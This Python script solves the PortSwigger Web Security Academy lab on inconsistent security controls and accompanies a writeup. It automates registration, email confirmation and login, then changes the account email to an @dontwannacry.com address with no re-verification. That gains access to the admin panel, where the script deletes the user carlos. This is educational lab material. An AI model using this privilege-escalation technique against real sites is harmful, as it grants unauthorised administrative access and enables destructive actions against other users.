#!/usr/bin/env python3
"""
Inconsistent security controls
PortSwigger Web Security Academy -- Business Logic Vulnerabilities

Companion script for the writeup: 03-inconsistent-security-controls.md

What this does:
    Registers a fresh account with an arbitrary email address, confirms it
    through the lab's own exploit-server email client, logs in, then uses
    the account's own /my-account/change-email endpoint to set the address
    to an arbitrary @dontwannacry.com value -- with no re-verification step
    required. That's enough to make /admin return the admin panel, from
    which it deletes carlos to solve the lab.

Usage:
    python 03-inconsistent-security-controls.py <lab-url>
    e.g. python 03-inconsistent-security-controls.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import random
import re
import string
import sys
import time
import httpx


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, base: str, username: str, password: str) -> None:
    csrf = _get_csrf(client, f"{base}/login")
    client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    c = httpx.Client(follow_redirects=True, timeout=15)

    email_domain = ""
    for path in ["/register", "/", "/login"]:
        r = c.get(f"{lab_url}{path}")
        dm = re.search(r'(exploit-[^"\'<>\s]+\.exploit-server\.net)', r.text)
        if not dm:
            dm = re.search(r'(exploit-[^"\'<>\s]+\.web-security-academy\.net)', r.text)
        if dm:
            email_domain = dm.group(1).rstrip("/")
            break

    if not email_domain:
        print("[-] Could not discover the exploit-server email client domain.")
        return
    print(f"[*] Email client domain: {email_domain}")

    rnd = ''.join(random.choices(string.ascii_lowercase, k=6))
    username = f"hacker{rnd}"

    csrf = _get_csrf(c, f"{lab_url}/register")
    c.post(f"{lab_url}/register", data={
        "csrf": csrf,
        "username": username,
        "email": f"{username}@{email_domain}",
        "password": "password123"
    })
    print(f"[*] Registered as {username}")

    time.sleep(2)
    email_page = c.get(f"https://{email_domain}/email")
    confirm_m = re.search(r"(https?://[^\"'<>\s]+temp-registration-token=[^\"'<>\s]+)", email_page.text)
    if not confirm_m:
        confirm_m = re.search(r"(https?://[^\"'<>\s]+register\?[^\"'<>\s]+)", email_page.text)
    if not confirm_m:
        print("[-] No confirmation email found.")
        return
    c.get(confirm_m.group(1))
    print("[*] Confirmed registration")

    _login(c, lab_url, username, "password123")

    csrf = _get_csrf(c, f"{lab_url}/my-account")
    c.post(f"{lab_url}/my-account/change-email", data={
        "csrf": csrf,
        "email": f"{username}@dontwannacry.com"
    })
    print(f"[*] Changed email to {username}@dontwannacry.com -- no re-verification required")

    admin_r = c.get(f"{lab_url}/admin")
    del_url = re.search(r'href="(/admin/delete\?username=carlos)"', admin_r.text)
    if del_url:
        c.get(f"{lab_url}{del_url.group(1)}")
        print("[*] Deleted carlos from the admin panel")

    check = c.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- admin access granted via post-registration email change.")
    else:
        print("[-] Not solved yet -- check whether /admin was reachable.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
